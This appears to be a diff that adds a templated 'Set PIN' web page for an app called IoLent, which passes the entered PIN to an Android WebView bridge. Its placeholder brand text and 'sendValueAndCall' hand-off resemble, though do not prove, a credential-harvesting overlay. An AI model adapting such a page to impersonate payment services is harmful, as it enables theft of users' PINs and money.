@@ -1,28 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>IoLent</title>
-<style>
-    body {
-        margin: 0;
-        height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        font-family: "Poppins", sans-serif;
-        background: #ffffff;
-    }
-    h1 {
-        font-size: 40px;
-        font-weight: 700;
-        color: #000000;
-    }
-</style>
+  <meta charset="UTF-8">
+  <title>Set PIN - IoLent</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    @keyframes fadeSlideUp { 0% { opacity: 0; transform: translateY(30px); } 100% { opacity: 1; transform: translateY(0); } }
+    @keyframes inputPop { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+
+    body { margin: 0; font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1B5E20, #1B5E20);
+           display: flex; align-items: center; justify-content: center; height: 100vh; }
+    .pin-container { background: white; padding: 30px 25px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+                     text-align: center; max-width: 320px; width: 100%; animation: fadeSlideUp 0.8s ease-out; }
+    .pin-container h2 { margin-bottom: 10px; color: #004d40; }
+    .pin-container p { color: #666; }
+    .pin-inputs { display: flex; justify-content: space-between; margin: 20px 0; }
+    .pin-inputs input { width: 50px; height: 60px; font-size: 24px; text-align: center; border: 2px solid #ccc; border-radius: 10px;
+                        transition: border-color 0.3s, transform 0.2s; animation: inputPop 0.4s ease forwards; }
+    .pin-inputs input:focus { border-color: #26a69a; outline: none; transform: scale(1.1); }
+    .submit-btn { background: #004d40; color: white; padding: 12px 30px; border: none; border-radius: 10px; font-size: 16px;
+                  cursor: pointer; transition: background 0.3s, transform 0.2s; }
+    .submit-btn:hover { background: #00796b; transform: scale(1.03); }
+    .footer { margin-top: 20px; font-size: 14px; color: #777; }
+  </style>
 </head>
 <body>
+  <div class="pin-container">
+    <h2>PAGETITLE</h2>
+    <p>Please enter OOOKKK 4-digit secure PIN</p>
+    <div class="pin-inputs">
+      <input type="password" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 0)">
+      <input type="password" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 1)">
+      <input type="password" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 2)">
+      <input type="password" maxlength="1" inputmode="numeric" oninput="moveToNext(this, 3)">
+    </div>
+    <button class="submit-btn" onclick="confirmPin()">Confirm</button>
+    <div class="footer">IoLent - Everything is Money</div>
+  </div>
 
-<h1>OurProject.html</h1>
+  <script>
+    const inputs = document.querySelectorAll('.pin-inputs input');
 
+    function moveToNext(current, index) {
+      if (current.value.length === 1 && index < inputs.length - 1) {
+        inputs[index + 1].focus();
+      }
+    }
+
+    function confirmPin() {
+      let pin = '';
+      for (let input of inputs) {
+        if (input.value === '') {
+          alert("Please enter all 4 digits");
+          return;
+        }
+        pin += input.value;
+      }
+      // Android JavaScript Interface কল
+      if (typeof Android !== "undefined" && Android.sendValueAndCall) {
+        Android.sendValueAndCall(pin);
+      } else {
+        alert("Android Interface not found!");
+      }
+    }
+  </script>
 </body>
 </html>
